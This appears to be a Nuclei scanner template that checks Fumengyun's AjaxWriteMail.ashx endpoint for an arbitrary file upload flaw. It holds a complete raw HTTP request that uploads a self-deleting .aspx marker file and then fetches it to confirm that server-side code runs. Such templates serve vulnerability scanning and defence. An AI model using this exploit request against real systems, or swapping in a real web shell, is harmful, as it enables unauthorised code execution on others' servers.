id: fumengyun-AjaxWriteMail_ashx-File-upload

info:
  name: 孚盟云 AjaxWriteMail.ashx 任意文件上传漏洞
  author: fumengyun
  severity: high
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /m/Dingding/Ajax/AjaxWriteMail.ashx?method=UpLoadAttachment HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk

        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
        Content-Type: text/plain

        <%@Page Language="C#"%><%Response.Write("sectestsectest");System.IO.File.Delete(Request.PhysicalPath);%>
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
    extractors:
       - type: regex 
         part: body
         name: uploadfile
         group: 1
         regex:
           - '([a-zA-Z0-9]+\.aspx)'
         internal: true
       - type: regex 
         part: body
         name: time
         group: 1
         regex:
           - '([0-9-]+)'
         internal: true
  - raw:
      - |
        GET /m/Dingding/images/dingDingWorkFlow/{{time}}/{{uploadfile}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'sectestsectest'
      - type: status
        status: 
          - 200